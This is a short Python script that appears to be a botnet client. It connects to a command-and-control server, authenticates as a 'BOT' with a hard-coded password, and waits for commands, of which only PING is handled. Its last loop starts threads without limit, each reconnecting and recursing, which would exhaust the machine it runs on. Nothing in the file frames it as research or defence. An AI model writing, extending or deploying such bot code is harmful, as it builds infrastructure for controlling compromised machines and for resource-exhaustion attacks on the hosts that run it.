import socket,time,threading
C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 8080
def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while 1:
                data = c2.recv(65536).decode()
                if 'MODE (BotC2,NixC2,MY_SQL)' in data:
                    time.sleep(1)
                    c2.send('BotC2'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(5)
    while 1:
        try:
            data = c2.recv(69999).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            if command == 'PING':
                c2.send('PONG'.encode())
        except:
            break

    c2.close()

    main()

while True:
    threading.Thread(target=main).start()